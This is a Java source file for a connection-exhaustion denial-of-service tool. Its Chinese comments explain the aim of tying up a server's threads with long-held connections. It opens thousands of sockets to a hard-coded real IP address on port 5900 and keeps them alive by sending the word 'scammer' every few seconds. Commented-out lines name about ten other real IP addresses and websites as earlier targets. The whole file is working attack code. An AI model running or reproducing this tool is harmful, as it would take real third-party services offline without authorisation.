package gongji.tomcat.cando;import java.io.BufferedWriter;import java.io.IOException;import java.io.OutputStreamWriter;import java.net.Socket;import java.net.UnknownHostException;import java.util.ArrayList;import java.util.List;public class CopyOfTrue_SocketClientsSendGongJi {	// 设计思路 长连接占用线程数 导致无服务	// 使用了一个线程 缺陷	// 省流量	// 设计思路 设置一个自增的空间100 每次检测是不是超了 如果是那就再加 知道最大3000	// public static String ip = "123.127.158.231";	// public static String ip = "211.144.152.109";	// public static String ip = "210.51.4.191";	// public static String ip = "118.123.253.130";	// public static String ip = "61.139.126.122";// tiqiaa.com	// public static String ip = "118.123.18.22";//bbs.tiqiaa.com php	// public static String ip = "218.28.186.194";//www.hncc.net 这个是微软IIS	// public static String ip = "119.161.210.75";	// public static String ip = "61.155.149.92";	// public static String ip = "1.93.161.60";	public static String ip = "118.145.5.135";	public static int port = 5900;	// 猜测对方设置的时间 默认20s 在这个时间内如果不连续发包会被清理掉	public static int checkMaxTime = 4;	public static int sendTime = 4;		public static int serverLinkAllSockets = 2000;// 猜测对方设置的最高线程数量 默认154	public static int everyAddSockets = 100;// 每次增加的数量	public static int MaxSockets = 10000;// 自己设置的上限	private List<linker> mlist = new ArrayList<linker>();	public class linker {		Socket s;		BufferedWriter br;		linker(Socket s) throws IOException {			this.s = s;			br = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));		}		void send() throws IOException {			if (s.isConnected()) {				br.write("骗子");				br.flush();			} else {				s.close();				mlist.remove(this);			}		}	}	public static void main(String[] args) throws IOException {		CopyOfTrue_SocketClientsSendGongJi m = new CopyOfTrue_SocketClientsSendGongJi();		m.allLink();	}	private void addMoreClient(String ip, int port, int allSockets) {		// TODO Auto-generated method stub				for (int i = 0; i < allSockets; i++) {			try {				Socket s = new Socket(ip, port);				linker l = new linker(s);				l.send();				this.mlist.add(l);			} catch (UnknownHostException e) {				// TODO Auto-generated catch block				// e.printStackTrace();			} catch (IOException e) {				// TODO Auto-generated catch block				// e.printStackTrace();			}		}	}	private void allLink() {		// TODO Auto-generated method stub		new Thread(new Runnable() {			@Override			public void run() {				// TODO Auto-generated method stub				long sleepTime = checkMaxTime * 1000L;				while (true) {					// 最少次数的发送 减少网络占用					// 如果已经建立过相当多的连接					testTopNumber();									try {						Thread.sleep(sleepTime);					} catch (InterruptedException e1) {						// TODO Auto-generated catch block						e1.printStackTrace();					}				}			}		}).start();		new Thread(new Runnable() {			@Override			public void run() {				// TODO Auto-generated method stub				long sleepTime = sendTime * 1000L;				while (true) {										try {						Thread.sleep(sleepTime);					} catch (InterruptedException e1) {						// TODO Auto-generated catch block						e1.printStackTrace();					}										// 最少次数的发送 减少网络占用					// 如果已经建立过相当多的连接					send();				}			}		}).start();	}		boolean isFrist=true;	protected void testTopNumber() {		// TODO Auto-generated method stub		if (CopyOfTrue_SocketClientsSendGongJi.this.mlist.size() < serverLinkAllSockets) {						if (this.mlist.size() >= MaxSockets) {				System.out.println("链接数量达到极限值" + MaxSockets + ",如需增加，请该参数重启");			} else {								int needSocket=0;				if(isFrist){					needSocket=serverLinkAllSockets;					isFrist=false;				}else{					needSocket=everyAddSockets;				}								System.err.println("XXX无效的工具数量 "+this.mlist.size()+" 缺少  现在添加" + needSocket);				CopyOfTrue_SocketClientsSendGongJi.this.addMoreClient(ip, port,						needSocket);						}		} else {			// 没有超出 （此刻）递增的最大数		}	}	private void send() {		// TODO Auto-generated method stub		System.out.println("持续有效的攻击数量:"				+ CopyOfTrue_SocketClientsSendGongJi.this.mlist.size()				+ " send....骗子");		for (int i = 0; i < CopyOfTrue_SocketClientsSendGongJi.this.mlist				.size(); i++) {			linker l = null;			try {				l = CopyOfTrue_SocketClientsSendGongJi.this.mlist.get(i);				if (l != null)					l.send();			} catch (IOException e) {				// TODO Auto-generated catch block				// e.printStackTrace();				// System.err.println("send error");				CopyOfTrue_SocketClientsSendGongJi.this.mlist.remove(l);			}		}		System.out.println("send ok");	}}